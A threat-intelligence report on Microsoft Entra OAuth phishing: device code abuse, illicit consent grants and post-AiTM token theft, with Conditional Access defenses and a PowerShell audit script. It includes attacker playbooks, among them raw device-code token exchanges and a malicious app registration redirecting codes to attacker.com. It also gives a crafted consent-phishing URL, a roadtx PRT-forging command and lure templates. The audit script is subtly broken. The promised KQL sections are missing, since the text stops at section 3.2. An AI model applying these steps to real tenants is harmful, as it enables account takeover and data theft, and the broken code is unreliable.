# Deep Research: Identity-Centric Phishing — OAuth/OIDC Flow Abuse
## Device Code Phishing · Illicit Consent Grant · AiTM Post-Compromise · Detection Engineering
### 2024–2026 Technical Intelligence Report

> **Sources:** Microsoft Security Blog (Feb 2025, May 2025, Oct 2025, Jan 2026) · Storm-2372 Advisory · Proofpoint Threat Research (Dec 2025) · Volexity (Feb 2025) · Elastic Security Labs (Jun 2025) · Microsoft Entra Community Hub (Jun 2025) · Microsoft Learn: Consent Phishing · glueckkanja ConsentFix analysis · Cloud-Architekt/AzureAD-Attack-Defense · TrustedSec Token Tactics 2.0 · dirkjanm/ROADtools · f-bader/TokenTacticsV2 · Darktrace (Apr 2025) · Keepnet Labs (Nov 2025) · Jeffrey Appel AiTM guide (Sept 2025)  
> **Compiled:** February 2026

---

## Table of Contents

1. [Device Code Flow Abuse](#section-1-device-code-flow-abuse)
   - [RFC 8628 Technical Breakdown](#11-rfc-8628-the-legitimate-protocol)
   - [The Phishing Exploit — Step by Step](#12-the-phishing-exploit--complete-step-by-step-breakdown)
   - [The Token Exchange Window](#13-the-token-exchange-window--how-long-does-the-attacker-have)
   - [APT29 / Storm-2372 2025 Campaigns](#14-apt29--storm-2372-2025-campaigns)
   - [The UNK_AcademicFlare Multi-Week Playbook](#15-unk_academicflare-multi-week-rapport-playbook)
   - [The Microsoft Auth Broker Escalation](#16-the-microsoft-authentication-broker-escalation-feb-14-2025)
   - [Phishing Lure Anatomy](#17-phishing-lure-anatomy)
   - [Red Team Tooling](#18-red-team-tooling)

2. [OAuth Consent Phishing — Illicit Consent Grant](#section-2-oauth-consent-phishing--illicit-consent-grant)
   - [How Attackers Register Malicious Apps](#21-how-attackers-register-malicious-oauth-apps)
   - [Scope Targeting Strategy](#22-scope-targeting-strategy)
   - [The Consent Phishing URL Structure](#23-the-consent-phishing-url-structure)
   - [ConsentFix — New Variant Dec 2025](#24-consentfix--new-variant-december-2025)
   - [Microsoft Entra Detection Signals](#25-microsoft-entra-detection-signals)
   - [Conditional Access Policies that Block This](#26-conditional-access-policies-that-block-this)
   - [Open-Source Audit Tools](#27-open-source-oauth-app-audit-tools)

3. [Session Cookie Theft Post-AiTM — The Golden Hour](#section-3-session-cookie-theft-post-aitm--the-golden-hour)
   - [Token Lifecycle](#31-token-lifecycle--what-the-attacker-has-and-for-how-long)
   - [The Golden Hour Playbook](#32-the-golden-hour-playbook--minute-by-minute)
   - [Step 1: Reconnaissance](#33-step-1-reconnaissance)
   - [Step 2: Inbox Rule Creation](#34-step-2-inbox-rule-creation)
   - [Step 3: Data Exfiltration](#35-step-3-data-exfiltration)
   - [Step 4: MFA Device Addition](#36-step-4-mfa-device-addition--persistence)
   - [Step 5: Lateral BEC Phishing](#37-step-5-lateral-bec-phishing)
   - [Step 6: PRT Acquisition and Device Registration](#38-step-6-prt-acquisition-and-device-registration)
   - [Remediation: What You Must Do Beyond Password Reset](#39-remediation-what-you-must-do-beyond-password-reset)

4. [Detection Engineering — Working KQL Queries](#section-4-detection-engineering--working-kql-queries)
   - [Query 1: Device Code Flow Abuse](#41-query-1-device-code-flow-abuse-storm-2372-pattern)
   - [Query 2: Risky Sign-in After Device Code Click](#42-query-2-risky-sign-in-correlated-with-device-code-url-click)
   - [Query 3: OAuth Auth Broker Exploitation](#43-query-3-microsoft-authentication-broker-client-id-abuse)
   - [Query 4: Illicit Consent Grant](#44-query-4-illicit-oauth-consent-grant)
   - [Query 5: Suspicious OAuth App Registration](#45-query-5-suspicious-oauth-app-registration)
   - [Query 6: AiTM Token Replay from Impossible Geography](#46-query-6-aitm-token-replay--impossible-travel-signin)
   - [Query 7: Post-Compromise Inbox Rule Creation](#47-query-7-post-compromise-inbox-rule-creation)
   - [Query 8: MFA Method Addition Post-Compromise](#48-query-8-mfa-method-addition-post-aitm)
   - [Query 9: Lateral BEC — Mass Internal Email](#49-query-9-lateral-bec--high-volume-internal-email-from-compromised-account)
   - [Query 10: SharePoint / OneDrive Mass Download](#410-query-10-sharepoint--onedrive-mass-download-post-compromise)

5. [MITRE ATT&CK Mapping](#mitre-attck-mapping)
6. [Portfolio Tool Opportunities](#portfolio-tool-opportunities)

---

## SECTION 1: Device Code Flow Abuse

> **Scale:** Since September 2025, device code phishing has shifted from targeted, limited APT activity to **widespread campaigns by both nation-state and financially-motivated actors** (Proofpoint, Dec 2025). Storm-2372 alone targeted governments, NGOs, and industry across multiple regions (Microsoft, Feb 2025). TA2723 launched tens-of-thousands-scale campaigns from October 2025. "Proofpoint assesses that the abuse of OAuth authentication flows will continue to grow with the adoption of FIDO-compliant MFA controls" — i.e., the industry's own MFA hardening is driving adoption of this bypass.

---

### 1.1 RFC 8628 — The Legitimate Protocol

The Device Authorization Grant (RFC 8628) was designed for **input-constrained devices** — smart TVs, printers, IoT sensors, game consoles — that cannot display a full browser or accept typed credentials. The flow separates authentication (which happens on a user's phone or laptop) from authorisation (which is ultimately bound to the device being enrolled).

**Legitimate use case:**
```
Smart TV wants to access Netflix
  ↓
TV contacts Netflix authorisation server
  ↓
Server returns: device_code, user_code, verification_uri, expires_in, interval
  ↓
TV shows user: "Visit netflix.com/activate and enter code: ABCD-1234"
  ↓
User picks up phone, visits URL, enters code, completes MFA on phone
  ↓
TV polls token endpoint repeatedly during this process
  ↓
Once user approves: TV receives access_token and refresh_token
```

**The complete token exchange (RFC 8628 § 3.4 — this is the exact HTTP exchange):**

```http
--- Step 1: Attacker's app (or red team tool) requests device_code ---

POST https://login.microsoftonline.com/common/oauth2/v2.0/devicecode
Content-Type: application/x-www-form-urlencoded

client_id=YOUR_CLIENT_ID
&scope=https://graph.microsoft.com/.default offline_access

--- Server response (JSON) ---
{
  "device_code": "DAQABAAEAAADnfolkvam2ObRB1Jm...",   // SECRET — not shown to user
  "user_code": "HDJB-MXKS",                            // Shown to user; entered at Microsoft URL
  "verification_uri": "https://microsoft.com/devicelogin",
  "expires_in": 900,                                   // Code is valid for 15 minutes
  "interval": 5,                                       // Poll every 5 seconds
  "message": "To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code HDJB-MXKS to authenticate."
}

--- Step 2: Attacker begins polling (while sending phishing to victim) ---

POST https://login.microsoftonline.com/common/oauth2/v2.0/token
Content-Type: application/x-www-form-urlencoded

grant_type=urn:ietf:params:oauth:grant-type:device_code
&client_id=YOUR_CLIENT_ID
&device_code=DAQABAAEAAADnfolkvam2ObRB1Jm...

--- Server response while waiting (authorization_pending) ---
{
  "error": "authorization_pending",
  "error_description": "AADSTS70016: Application is waiting for user authorization..."
}

--- Step 3: Victim visits microsoft.com/devicelogin, enters HDJB-MXKS, completes MFA ---

--- Step 4: Attacker's next poll returns access ---
{
  "token_type": "Bearer",
  "scope": "https://graph.microsoft.com/.default",
  "expires_in": 3600,
  "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6...",
  "refresh_token": "0.AXoAqhL6hBaaIkymIMCmOmcWgFo5...",
  "id_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6..."
}
```

**Why this bypasses MFA:** The MFA challenge is completed by the victim on the legitimate `microsoft.com/devicelogin` page. The attacker never touches the MFA step — they simply wait at the polling endpoint. The resulting access token and refresh token are **already authenticated with MFA claims** because the victim completed it. The attacker didn't bypass MFA; the victim *handed them a post-MFA token*.

---

### 1.2 The Phishing Exploit — Complete Step-by-Step Breakdown

```
ATTACKER PREPARATION:
  ①  Register an application in Azure Entra ID (Microsoft's own tenant)
       → App Type: "Public client / native application"
       → Supported account types: "Accounts in any organizational directory"
         (multi-tenant) — allows access to ANY organisation's users
       → No client secret required for public clients
       → Request scopes: https://graph.microsoft.com/.default
                         (Mail.Read, Files.ReadWrite, etc. bundled by default)
       → Extract the client_id from the app registration

  ②  POST to /devicecode endpoint with that client_id
       → Receive device_code (secret) + user_code (for victim) + 15-min timer
       → Start polling /token endpoint every 5 seconds

  ③  Send phishing lure to target (see Section 1.7 for lure anatomy)

VICTIM INTERACTION:
  ④  Victim receives email or message with link/QR code
  ⑤  Victim clicks link → attacker-controlled landing page
       → Page shows company branding (localized to victim's IP)
       → Page displays: "Enter this code: HDJB-MXKS at microsoft.com/devicelogin
                         to complete MFA token secure authentication"
       → Lure presents this as an OTP or MFA step — NOT as device authorisation

  ⑥  Victim navigates to real microsoft.com/devicelogin
       → Enters user_code HDJB-MXKS
       → Page says: "You are about to sign in to [Attacker's App Name] on
                     [some device]"
       → Victim clicks Continue, completes MFA on their real account

TOKEN DELIVERY:
  ⑦  Attacker's polling loop receives success response within 5 seconds of
       victim completing Step ⑥
       → access_token: valid for 1 hour (Exchange Online, Graph API)
       → refresh_token: valid for 90 days (can request new access tokens)
       → id_token: contains name, UPN, tenant ID

POST-COMPROMISE:
  ⑧  Attacker uses access_token immediately:
       GET https://graph.microsoft.com/v1.0/me/messages → exfil email
       GET https://graph.microsoft.com/v1.0/me/drive/root/children → OneDrive
       GET https://graph.microsoft.com/v1.0/users → enumerate all users

  ⑨  Attacker uses refresh_token for persistence:
       → Refresh tokens by default: 90 days for AAD tokens
       → Can silently exchange for new access_tokens without any user action
       → Until an admin revokes the token, access persists even after
          password reset
```

---

### 1.3 The Token Exchange Window — How Long Does the Attacker Have?

This is the most operationally important question for defenders.

| Token Type | Default Lifetime | When Revoked |
|-----------|-----------------|-------------|
| `user_code` | **15 minutes** (expires_in: 900) — this is the phishing window | Expires automatically; attacker must re-initiate if victim misses it |
| `access_token` | **1 hour** (3600 seconds) | Revoked by: admin token revocation, password reset + session revoke, CAE policy event |
| `refresh_token` | **90 days** (non-persistent) / **1 year** (persistent / Keep me signed in) | Revoked by: `revokeSignInSessions`, password reset (optionally), admin revocation |
| `PRT` (Primary Refresh Token — see Section 1.6) | **14 days** (renewed on use) | Revoked by: device management policy, MDM unenrolment, admin action |

**The 15-minute window problem:** Standard device codes expire in 900 seconds. This is short for a manual, spray-and-pray campaign. Red team tools **SquarePhish** and **SquarePhishV2** (public, GitHub) were explicitly designed to address this:
- SquarePhish sends an initial email with a QR code, then sends a *second* email with the actual device code *only after* the victim confirms interest by clicking the QR code
- This two-stage approach ensures the device code is only requested when the victim is actively engaged, maximising the probability of redemption within the 15-minute window
- **Graphish** (underground forum tool, Dec 2025) adds automated polling and AiTM integration

---

### 1.4 APT29 / Storm-2372 2025 Campaigns

#### Storm-2372 (February 2025 — Microsoft Threat Intelligence)

Storm-2372 is assessed with moderate confidence to align with Russia's interests and tradecraft. The attacks appear to have been ongoing since August 2024 and targeted governments, NGOs, and a wide range of industries in multiple regions.

**Lure method (documented by Microsoft):** Third-party messaging apps (WhatsApp, Signal) — not email. The attacker impersonated a trusted or authoritative figure relevant to the target, built rapport, then sent phishing emails with fake meeting or event invitations containing device code phishing lures.

**February 14, 2025 pivot:** Microsoft observed Storm-2372 shift to using the specific client_id for the **Microsoft Authentication Broker** in the device code flow — a significant capability upgrade (see Section 1.6).

#### APT29 / Midnight Blizzard — Watering Hole Device Code Campaign (August 2025)

APT29 infected legitimate, high-traffic websites with malicious JavaScript code. The purpose was to redirect approximately 10% of traffic to a phishing site. Additionally, the code created cookies on victims' computers to ensure the same device was not redirected multiple times to reduce the risk of discovery.

**Technical execution:**
- Compromised multiple legitimate websites frequently visited by targets (diplomatic, government, defence sector)
- Injected Base64-encoded, obfuscated JavaScript
- 10% traffic redirect rate — reduces noise, extends campaign lifetime
- Cookie-based deduplication — same user never sees it twice (limits analyst discovery via repeated site visits)
- Redirect destinations: `findcloudflare[.]com`, `cloudflare[.]redirectpartners[.]com` — designed to mimic Cloudflare CAPTCHA pages
- On these fake Cloudflare pages, users were presented with what looked like a normal CAPTCHA challenge, but solving it kicked off Microsoft's device code flow.

---

### 1.5 UNK_AcademicFlare Multi-Week Rapport Playbook

The activity, tracked as UNK_AcademicFlare since September 2025, targets government, think tanks, higher education, and transportation sectors in the US and Europe using compromised government and military email accounts.

**Full campaign sequence (Proofpoint Dec 2025):**

```
WEEK 1-3: RAPPORT BUILDING
  ① Attacker compromises legitimate government/military email account
  ② Sends BENIGN outreach email from compromised account
     → Topic: directly relevant to target's area of expertise
     → Purpose: establish authenticity via legitimate-seeming account
     → Example: "I'm preparing for a conference on [target's specialty] —
                  I'd love your perspective on [relevant topic]"

WEEK 2-4: MEETING ARRANGEMENT
  ③ Follow-up emails develop relationship
  ④ Attacker proposes interview, meeting, or collaborative document review
     → "I'd like to prepare some questions for you before we speak —
        would you mind reviewing this document in advance?"

FINAL STEP: THE DEVICE CODE DELIVERY
  ⑤ Sends link to Cloudflare Worker URL spoofing the compromised sender's
     OneDrive account
     → "Here are the interview questions — please click to review before
        our call"
  ⑥ Cloudflare Worker page instructs victim to:
     "Copy the provided code and click Next to access the document"
  ⑦ User enters code at microsoft.com/devicelogin
  ⑧ Attacker receives access + refresh tokens for government/think tank target
```

**Why 15-minute window is not a problem for UNK_AcademicFlare:** The multi-week rapport means the victim is actively waiting for the document. When they click the link, they are in a mentally primed state for the authentication step — they complete it immediately. The code is requested and delivered at the moment of engagement, not in advance.

---

### 1.6 The Microsoft Authentication Broker Escalation (Feb 14, 2025)

Within the past 24 hours [of February 14, 2025], Microsoft observed Storm-2372 shifting to using the specific client ID for Microsoft Authentication Broker in the device code sign-in flow.

**Why this is more dangerous than a regular app registration:**

| Aspect | Regular Third-Party App | Microsoft Authentication Broker Client ID |
|--------|------------------------|------------------------------------------|
| Client ID | Attacker-registered app ID (may be blocked by Conditional Access app restrictions) | `29d9ed98-a469-4536-ade2-f981bc1d605e` — a **Microsoft first-party application** |
| Conditional Access | Can be blocked by "block unknown/unverified apps" policy | First-party app → often in CA allowlist → bypasses app-based restrictions |
| Scopes available | Configured at registration | Broker has elevated scopes including device registration access |
| Token type | Access + refresh token | Can proceed to PRT (Primary Refresh Token) acquisition |
| Detection | App registration telemetry shows third-party ID | Shows as legitimate Microsoft internal client — harder to flag |

**The PRT chain (documented by Elastic Security Labs and TrustedSec, 2025):**

```
Device Code phishing with Auth Broker client_id
  ↓
Receive refresh_token with offline_access scope
  ↓
Use ROADtools roadtx device → register attacker-controlled virtual device
  with target tenant
  ↓
Forge PRT using device private key + refresh_token:
  roadtx prt -u victim@org.com --key-pem device.key --cert-pem device.pem
  ↓
PRT = token-granting token. Can silently request access tokens for:
  • Exchange Online (email)
  • SharePoint (files)
  • Microsoft Graph (users, groups, calendars, Teams)
  • Azure AD management APIs
  ↓
Inject PRT into browser session via roadtx browseautologon → authenticated
  browser session with NO further user interaction
  ↓
Persistence: PRT renews on use (valid 14 days), automatically refreshes
  as long as the registered device is not removed from Entra ID
```

---

### 1.7 Phishing Lure Anatomy

**Four confirmed lure patterns from 2025 campaigns:**

**Lure Pattern 1: Salary/Document Sharing (TA2723, Oct–Dec 2025)**
```
Subject: [Organisation Name] OCTOBER_SALARY_AMENDED RefID:6962_yslFRVQnQ
Body:    "A document has been shared with you: [Recipient Name] - Salary Bonus +
          Employer Benefit Reports 25.xlsx
          [View Document button → Google Share URL → attacker site]"

Landing page:
  → Company branding (localised to victim IP)
  → "Enter your email to access the document"
  → Pop-up: "Complete secure authentication. Your MFA token:
              HDJB-MXKS
              Visit microsoft.com/devicelogin and enter this code to verify"
```

**Lure Pattern 2: Security Re-Verification Theme (general spray)**
```
Subject: "Action Required: Re-Authenticate Your Microsoft 365 Token"
Body:    "Your session token has expired. To maintain access to your account,
          please complete re-authentication.
          [Secure Token Re-Auth button → QR code → device code page]"

Landing page:
  → Scan QR code → (SquarePhish two-stage) → device code delivered only
    after QR scan confirms active engagement
```

**Lure Pattern 3: Meeting/Conference (UNK_AcademicFlare)**
```
Prior benign outreach → rapport built → final message:
"I've attached the questions for our upcoming interview.
 Please click [here] to access the document before our call."
Link: Cloudflare Worker URL → spoofed OneDrive → device code workflow
```

**Lure Pattern 4: APT29 Watering Hole (no email)**
```
Victim visits legitimate compromised website → 10% redirect probability →
Fake Cloudflare CAPTCHA page →
"Verify you are human" → solving CAPTCHA initiates device code flow
→ Code displayed on page → instructions to enter at microsoft.com/devicelogin
```

---

### 1.8 Red Team Tooling

| Tool | Type | Function | Notes |
|------|------|----------|-------|
| **SquarePhish** | Public (GitHub) | Two-stage device code phishing via QR code and email | Designed specifically to beat 15-min expiry with staged delivery |
| **SquarePhishV2** | Public (GitHub) | Updated version with more automation | Proofpoint confirmed in active campaigns |
| **Graphish** | Underground forum (free) | Phishing kit with Azure App Registration + AiTM proxy + device code | Lowers barrier to enterprise-scale campaigns |
| **ROADtools** (dirkjanm) | Public (GitHub) | Entra ID enumeration + token exchange + device registration + PRT acquisition | The most comprehensive open-source Entra attack toolkit |
| **TokenTacticsV2** (f-bader) | Public (GitHub) | PowerShell token refresh/exchange; CAE-aware; FOCI abuse | Used post-device-code-compromise to pivot to other resources |
| **GraphSpy** | Public (GitHub) | Web UI for token management; device code polling; Graph API access | Used for post-compromise data extraction |
| **roadtx** | Public (GitHub) | PRT operations, device registration, browser injection, Selenium MFA automation | The operational tool for the Auth Broker escalation chain |

---

## SECTION 2: OAuth Consent Phishing — Illicit Consent Grant

> **Core insight:** Unlike device code phishing (which abuses a legitimate auth flow) or AiTM (which intercepts credentials in transit), illicit consent grant attacks **give the attacker a permanent OAuth grant** — persistent, credentialless access that survives password resets, MFA changes, and session revocation. Until the grant itself is revoked, the attacker has API-level access to the victim's data on a schedule of their choosing. The user's authentication method is completely irrelevant.

---

### 2.1 How Attackers Register Malicious OAuth Apps

**Step-by-step app registration for illicit consent grant (from logpoint.com analysis, confirmed by Elastic Security Labs emulation):**

```
① Create a free Azure account (or use a compromised Azure subscription)

② Navigate to: Entra ID → App registrations → New registration

③ Configure the malicious app:
     Name: Something convincing — e.g., "365 Secure File Share",
            "OneDrive Sync Helper", "Microsoft Teams Addon", "Docusign Connect"
     Supported account types: "Accounts in any organizational directory"
       (Critical: multi-tenant allows the app to request consent from
        ANY tenant — not just the attacker's)
     Redirect URI: https://attacker.com/oauth/callback
                  (receives the authorization code after consent)

④ Add API permissions (Microsoft Graph):
     Mail.Read           → Read all victim email
     Mail.ReadWrite      → Read + delete + move victim email
     Mail.Send           → Send email AS the victim (BEC enablement)
     Files.ReadWrite.All → Full OneDrive access
     Calendars.ReadWrite → Calendar access for meeting intelligence
     Contacts.ReadWrite  → Contact list exfiltration
     User.Read.All       → Enumerate all users in the tenant (admin role required, 
                            but attackers often request it anyway)
     offline_access      → Persist with refresh tokens

⑤ DO NOT grant admin consent (that would be logged and require admin auth)
     → Instead: craft user consent URL for individual victim phishing

⑥ Craft the phishing URL:
     https://login.microsoftonline.com/common/oauth2/v2.0/authorize
     ?client_id=<ATTACKER_APP_CLIENT_ID>
     &response_type=code
     &redirect_uri=https://attacker.com/oauth/callback
     &scope=https://graph.microsoft.com/Mail.Read%20https://graph.microsoft.com/Files.ReadWrite.All%20offline_access
     &state=<random>

⑦ When victim clicks this URL and consents:
     → Microsoft redirects to attacker's redirect_uri with ?code=AUTHCODE
     → Attacker exchanges code for access + refresh tokens:
       POST /oauth2/v2.0/token
       grant_type=authorization_code
       &code=AUTHCODE
       &client_id=ATTACKER_APP
       &client_secret=ATTACKER_SECRET
       &redirect_uri=https://attacker.com/oauth/callback

⑧ Attacker now has:
     → access_token for immediate Graph API calls
     → refresh_token for indefinite persistence (until admin revokes the grant)
     → The OAuth grant is recorded in the victim's "My Apps" and in Entra ID
       audit logs under "Consent to application"
```

**July 2025 Policy Change:** A Microsoft managed consent policy will be enabled by default starting in July 2025. With this change, by default users will be unable to consent to third-party applications accessing their files and sites. This is the most significant Entra ID defensive change of 2025 — but it only protects **new** deployments with the default policy. All organisations that changed the default consent settings before July 2025 remain at risk unless they explicitly enable the new policy.

---

### 2.2 Scope Targeting Strategy

**How attackers select scopes — the trade-off between capability and detection:**

| Scope Tier | Scopes Requested | Capability | Detection Risk |
|-----------|-----------------|------------|---------------|
| **Minimal — surveillance** | Mail.Read, offline_access | Persistent email read; inbox monitoring | Low — looks like email client |
| **BEC-optimised** | Mail.ReadWrite, Mail.Send, offline_access | Read + send email AS victim; delete evidence | Medium — Mail.Send flags as high-risk |
| **Full data exfil** | Mail.ReadWrite.All, Files.ReadWrite.All, User.ReadWrite.All | Everything — email, files, directory | High — admin consent required for .All variants on some scopes |
| **Persistence-focused** | offline_access + Mail.Read + Calendars.Read | Long-term access with minimal footprint | Lowest — Calendars.Read rarely reviewed |

**The "low and slow" consent strategy (documented in 2025 campaigns):** Attackers register apps requesting *only* Mail.Read and Calendars.Read — scopes that appear in thousands of legitimate apps (email clients, calendar sync tools). The consent prompt looks indistinguishable from installing a productivity add-in. After establishing the grant, the attacker uses the access token to read email for weeks, silently harvesting intelligence, wire transfer details, or credential reset emails, before escalating to a BEC attack.

---

### 2.3 The Consent Phishing URL Structure

**What defenders should recognise as a consent phishing URL:**

```
https://login.microsoftonline.com/common/oauth2/v2.0/authorize
? client_id    = [EXAMINE: is this a known app? verify in Entra App Gallery]
& response_type = code
& redirect_uri  = [EXAMINE: does this match the app's registered redirect?
                    Is this an external domain?]
& scope         = [EXAMINE: Mail.Read? Files.ReadWrite? offline_access?
                    Any of these from an unknown app = SUSPICIOUS]
& state         = [random value — used to CSRF-protect the callback]

Legitimate example:
https://login.microsoftonline.com/common/oauth2/v2.0/authorize
?client_id=4765445b-32c6-49b0-83e6-1d93765276ca   ← Outlook (Microsoft's own)
&scope=offline_access+Mail.Read

Malicious example:
https://login.microsoftonline.com/common/oauth2/v2.0/authorize
?client_id=71c79d27-bfda-42f6-b5e3-8a2e97831aa3   ← Unknown app, multi-tenant
&redirect_uri=https://365securelogin.com/callback  ← External domain
&scope=Mail.Read+Mail.Send+Files.ReadWrite.All+offline_access
```

**The "declined consent still redirects" attack (Microsoft Security Blog, May 2025):**
In one OAuth consent phishing campaign recently identified by Microsoft, even if a user declines the requested app permissions by clicking Cancel on the prompt, the user is still sent to the app's reply URL, and from there redirected to an AiTM domain for a second phishing attempt. Defenders must train users that declining consent is not safe — the click itself delivers them to attacker infrastructure.

---

### 2.4 ConsentFix — New Variant, December 2025

**PushSecurity identified "ConsentFix" (also called "AuthCodeFix") in December 2025** — a ClickFix-inspired OAuth attack that bypasses Conditional Access:

```
MECHANISM:
  ① Attacker crafts a legitimate-looking OAuth authorisation URL targeting
     a Microsoft first-party app (e.g., Azure CLI, client_id known)
     with localhost as redirect URI (also pre-consented for many first-party apps)
  
  ② Attack page (ClickFix-style) instructs victim to:
     "Complete authentication — copy this link and paste it into your browser"
     → The link IS the OAuth authorise URL
  
  ③ Victim's browser processes the URL → authenticates via their existing
     session → authorization code returned in URL bar/redirect
  
  ④ Attacker's ClickFix-style page has JavaScript that reads the authorization
     code from the URL (or instructs victim to paste the full redirect URL
     back into a form field)
  
  ⑤ Attacker exchanges the authorization code for tokens

WHY IT BYPASSES CA:
  → Uses a Microsoft first-party client_id (not an unknown third-party app)
  → Uses localhost redirect URI (often explicitly allowed in CA policies)
  → CA policies that block unknown apps don't trigger
  → The auth code exchange happens client-side before CA can evaluate context

DETECTION SIGNAL (glueckkanja analysis):
  → Time gap: legitimate automated flows redeem auth codes in milliseconds
    Malicious flows require user copy-paste → redemption takes seconds to minutes
  → KQL filter: auth code redeemed > 5 seconds after authorization = suspicious
  → Token type: unbound token (not device-bound, not compliant)
  → ASN/network change between authorization and redemption
```

---

### 2.5 Microsoft Entra Detection Signals

**Built-in Entra ID signals for suspicious OAuth apps:**

| Signal | Where to Find | What it Means |
|--------|--------------|---------------|
| **App consent from unverified publisher** | Entra ID Audit Logs → AuditLogs → Consent to application | App has no Microsoft Publisher Verification — high risk |
| **Multi-tenant app first consent in tenant** | AuditLogs → "Add service principal" | New third-party app just consented to by first user |
| **High-privilege scope consent** | AuditLogs → "Consent to application" → ModifiedProperties.Permissions | Mail.Send, Files.ReadWrite.All, Directory.ReadWrite.All |
| **App risk score in Defender for Cloud Apps** | Microsoft Defender for Cloud Apps → OAuth apps → Risk score | Apps rated < 5/10 flag as risky |
| **Anomalous app activity** | Defender for Cloud Apps → Activity policies → Anomaly detection | Unusual volume of Graph API calls post-consent |
| **Service principal created in new IP** | AuditLogs → "Add service principal" + SignInLogs cross-reference | App registered and first used from unusual geography |

**Entra ID Protection signals:**
- `riskyServicePrincipals` API — returns service principals flagged as risky
- `servicePrincipalRiskEvents` API — returns risk events for each app
- Defender for Cloud Apps: OAuth app governance → "Unusual ISP for OAuth app" alert

---

### 2.6 Conditional Access Policies that Block This

**Policy 1 — Block user consent to third-party apps (HIGHEST PRIORITY)**
```
Entra ID → Enterprise Applications → User Settings → 
  User consent for apps: 
    ✓ "Allow user consent for apps from verified publishers, for selected 
       permissions (Recommended)"
    OR (most secure):
    ✓ "Do not allow user consent" → Require admin approval for all app consent

Admin Consent Workflow:
  Entra ID → Enterprise Applications → Admin consent settings →
  Users can request admin consent to apps they are unable to consent to: Yes
  (Creates a workflow; doesn't silently block users)
```

**Policy 2 — Conditional Access: Block device code flow (blocks Section 1 attacks)**
```
Conditional Access → New Policy:
  Name: "Block Device Code Flow"
  Users: All Users (or All except specific service accounts)
  Cloud apps: All cloud apps
  Conditions: Authentication flows: Device code flow = Yes
  Grant: Block access

Note: Verify no legitimate IoT/smart TV/printer integrations rely on this
       before deploying to production. Use Report-Only mode first.
```

**Policy 3 — App Instance Restriction / App Filter**
```
Conditional Access → New Policy:
  Conditions: Client apps: Browser + Mobile apps and desktop clients
  Conditions: Filter for applications:
    Rule: "Publisher Verified" = "No" → Block access
  (Requires Entra ID P2)
```

**Policy 4 — Require Compliant/Registered Device for OAuth app consent**
```
Conditional Access → New Policy:
  Conditions: Cloud apps: Select third-party apps category
  Grant: Require device to be marked as compliant
       OR: Require Hybrid Azure AD joined device
  
Effect: OAuth consent can only occur from a managed, compliant device —
         cuts off attacker-controlled machine as consent-granting platform
```

---

### 2.7 Open-Source OAuth App Audit Tools

**For defenders — auditing what OAuth grants already exist in a tenant:**

| Tool | GitHub | Function | Ideal For |
|------|--------|----------|-----------|
| **ROADrecon** (dirkjanm) | `dirkjanm/ROADtools` | Enumerate all app registrations, service principals, OAuth grants, permissions in tenant → SQLite + web UI | Complete tenant OAuth audit |
| **AADInternals** | `Gerenios/AADInternals` (PowerShell) | `Get-AADIntOAuth2PermissionGrants` — dumps all delegated grants; `Get-AADIntApplications` — lists all apps | Incident response; PowerShell-native environments |
| **Microsoft 365 DSC** | `microsoft/Microsoft365DSC` | Export and diff all Entra ID configurations including OAuth apps | Compliance and configuration drift detection |
| **Microsoft Graph API** (direct) | Native | `GET /oauth2PermissionGrants?$top=999` — all delegated grants; `GET /servicePrincipals?$filter=appOwnerOrganizationId ne [tenant_id]` — all third-party apps | Custom audit scripts |
| **365-Stealer** | Public (educational/red team) | Demonstrates illicit consent grant via a phishing app registration | Red team simulation; understanding attacker tooling |
| **GraphSpy** | Public (GitHub) | Web UI for Graph API access; shows token scopes and accessible resources | Post-consent audit — what can an attacker actually access? |

**PowerShell audit: find all high-privilege OAuth grants in a tenant:**

```powershell
# Connect to Microsoft Graph
Connect-MgGraph -Scopes "Directory.Read.All", "Application.Read.All"

# Get all service principals (registered apps + external apps)
$servicePrincipals = Get-MgServicePrincipal -All

# Get all OAuth2 permission grants (delegated permissions)
$grants = Get-MgOauth2PermissionGrant -All

# Flag high-risk scopes
$dangerousScopes = @("Mail.Read", "Mail.ReadWrite", "Mail.Send", 
                     "Files.ReadWrite", "Files.ReadWrite.All",
                     "Directory.ReadWrite.All", "RoleManagement.ReadWrite.Directory",
                     "offline_access", "User.ReadWrite.All")

foreach ($grant in $grants) {
    $scopes = $grant.Scope -split " "
    $riskyScopes = $scopes | Where-Object { $dangerousScopes -contains $_ }
    if ($riskyScopes) {
        $app = $servicePrincipals | Where-Object { $_.Id -eq $grant.ClientId }
        [PSCustomObject]@{
            AppName    = $app.DisplayName
            AppId      = $app.AppId
            Tenant     = $app.AppOwnerOrganizationId  # 'null' = in your tenant
            GrantedBy  = $grant.PrincipalId            # Specific user or 'AllPrincipals'
            RiskyScopes = ($riskyScopes -join ", ")
            ConsentType = $grant.ConsentType            # 'AllPrincipals' = admin consent
        }
    }
} | Format-Table -AutoSize
```

---

## SECTION 3: Session Cookie Theft Post-AiTM — The Golden Hour

> **The core problem with AiTM remediation:** In a standard credential compromise, the incident response playbook is: reset password + revoke sessions. In AiTM cookie theft, password reset alone is **insufficient**. The attacker has already obtained: (a) a valid session cookie that doesn't depend on password, (b) potentially a refresh token for 90 days of access, and (c) possibly a new MFA device registration. Each of these must be separately revoked. Missing any one of them means the attacker retains access despite full password reset.

---

### 3.1 Token Lifecycle — What the Attacker Has and for How Long

After a successful Tycoon 2FA / EvilProxy / Evilginx3 AiTM interception:

```
Attacker obtains:
  ├── Session cookie (ESTSAUTH / ESTSAUTHPERSISTENT)
  │     Valid: 1 hour (non-persistent) to 90 days (Keep me signed in)
  │     Scope: Authenticates as the victim to Exchange Online, SharePoint, Teams
  │     Risk: Can be replayed from any IP without triggering MFA
  │
  ├── Access token (embedded in session cookie)
  │     Valid: 1 hour
  │     Scope: Specific resource (Exchange, Graph, etc.)
  │
  └── Refresh token (if ESTS flow captures it)
        Valid: 90 days (non-persistent) / 1 year (persistent)
        Scope: Exchange new access tokens silently
        Risk: Survives password reset unless admin revokes with
              revokeSignInSessions

CRITICAL: Continuous Access Evaluation (CAE) can revoke mid-session
  When enabled: token revocation propagates to CAE-capable workloads
                within minutes (not on token expiry)
  Coverage: Exchange Online, SharePoint Online, Teams — partially protected
  Not covered: Many third-party apps and API integrations
```

---

### 3.2 The Golden Hour Playbook — Minute by Minute

Analysis revealed that attackers acted within minutes of stealing session cookies, launching suspicious activities and replying to ongoing financial threads within the compromised mailbox.

